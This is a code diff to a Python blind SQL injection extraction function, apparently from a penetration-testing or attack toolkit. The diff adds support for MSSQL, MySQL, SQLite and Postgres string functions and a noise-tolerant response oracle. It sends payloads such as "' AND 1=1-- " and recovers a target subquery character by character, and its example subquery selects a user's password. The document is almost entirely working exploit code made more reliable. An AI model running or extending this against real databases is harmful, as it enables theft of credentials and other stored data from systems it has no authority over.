@@ -237,31 +237,49 @@ def sqli_union_dump(url_template, dbms="auto", table=None, columns=None, max_row
           params={"type": "object", "properties": {
               "url_template": {"type": "string"},
               "subquery": {"type": "string", "description": "scalar SQL, e.g. SELECT password FROM users WHERE id=1"},
-              "max_chars": {"type": "integer", "default": 32}},
+              "max_chars": {"type": "integer", "default": 32},
+              "dialect": {"type": "string", "description": "mysql (default) | mssql | sqlite | postgres — V7: MSSQL needs SUBSTRING/LEN"}},
               "required": ["url_template", "subquery"]},
           danger="careful")
-def sqli_blind_extract(url_template, subquery, max_chars=32):
+def sqli_blind_extract(url_template, subquery, max_chars=32, dialect="mysql"):
     if "{INJ}" not in url_template:
         return verdict("sqli_blind_extract", False, "url_template lacks {INJ}")
+    # V7 (audit 2.3): byte-exact length signatures break on ANY dynamic
+    # byte (server clock, session banner) — extraction drifts to "????".
+    # Noise-normalized signature: strip volatile runs (digits/whitespace)
+    # before hashing; length bucketed to ±4%. AND the dialect gates
+    # MSSQL (SUBSTRING/LEN) vs MySQL/SQLite (SUBSTR/LENGTH).
+    _FN = {"mssql": ("SUBSTRING", "LEN"), "mysql": ("SUBSTR", "LENGTH"),
+           "sqlite": ("SUBSTR", "LENGTH"), "postgres": ("SUBSTR", "LENGTH")}
+    sub_fn, len_fn = _FN.get((dialect or "mysql").lower(), ("SUBSTR", "LENGTH"))
+
+    import re as _re
+    def _noise_sig(body):
+        b = body or ""
+        b = _re.sub(r"\d{2,}", "#", b)          # server clocks / counters
+        b = _re.sub(r"\s+", " ", b).strip()      # whitespace churn
+        return len(b), __import__("hashlib").md5(
+            b.encode(errors="replace")).hexdigest()[:10]
+
     # calibrate true vs false oracle
     t_st, t_body, _ = paced_send(apply_template(url_template, "' AND 1=1-- "))
     f_st, f_body, _ = paced_send(apply_template(url_template, "' AND 1=2-- "))
     if t_body == f_body:
         return verdict("sqli_blind_extract", False,
                        "boolean oracle dead — true/false responses identical")
-    t_sig = (t_st, len(t_body or ""))
-    f_sig = (f_st, len(f_body or ""))
+    t_sig = (t_st, _noise_sig(t_body))
+    f_sig = (f_st, _noise_sig(f_body))
 
     def oracle(cond_sql):
         st, body, _ = paced_send(apply_template(url_template, f"' AND ({cond_sql})-- "))
-        sig = (st, len(body or ""))
+        sig = (st, _noise_sig(body))
         return sig == t_sig or (sig != f_sig and t_st == st)
 
     # length — power-of-2 scan then bisect to exact length
     upper_bound = 0
     prev = 0
     for n in (1, 2, 4, 8, 16, 32, 64, 128):
-        if oracle(f"LENGTH(({subquery}))>{n - 1}"):
+        if oracle(f"{len_fn}(({subquery}))>{n - 1}"):
             prev = n
             upper_bound = n
         else:
@@ -271,7 +289,7 @@ def sqli_blind_extract(url_template, subquery, max_chars=32):
     lo_len, hi_len = prev, upper_bound
     while hi_len - lo_len > 1:
         mid_len = (lo_len + hi_len) // 2
-        if oracle(f"LENGTH(({subquery}))>{mid_len - 1}"):
+        if oracle(f"{len_fn}(({subquery}))>{mid_len - 1}"):
             lo_len = mid_len
         else:
             hi_len = mid_len
@@ -281,7 +299,7 @@ def sqli_blind_extract(url_template, subquery, max_chars=32):
         lo, hi = 32, 126
         while lo < hi:
             mid = _wsplit(lo, hi)
-            if oracle(f"ASCII(SUBSTR(({subquery}),{i},1))>{mid}"):
+            if oracle(f"ASCII({sub_fn}(({subquery}),{i},1))>{mid}"):
                 lo = mid + 1
             else:
                 hi = mid
